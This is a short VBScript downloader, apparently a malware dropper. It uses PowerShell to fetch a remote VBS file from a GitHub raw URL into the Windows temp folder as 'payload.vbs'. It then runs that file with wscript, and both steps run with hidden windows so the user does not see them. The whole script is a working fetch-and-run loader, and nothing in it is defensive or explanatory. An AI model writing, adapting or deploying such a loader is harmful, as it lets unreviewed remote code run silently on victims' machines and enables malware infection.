Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

url = "https://raw.githubusercontent.com/theredbruno/Service/refs/heads/main/july3cryptnostartup.vbs"
vbsPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.vbs"

' Download the VBS file via PowerShell
cmd = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & vbsPath & "' -UseBasicParsing -ErrorAction Stop"""
shell.Run cmd, 0, True

' Execute it silently
shell.Run "wscript """ & vbsPath & """", 0, False
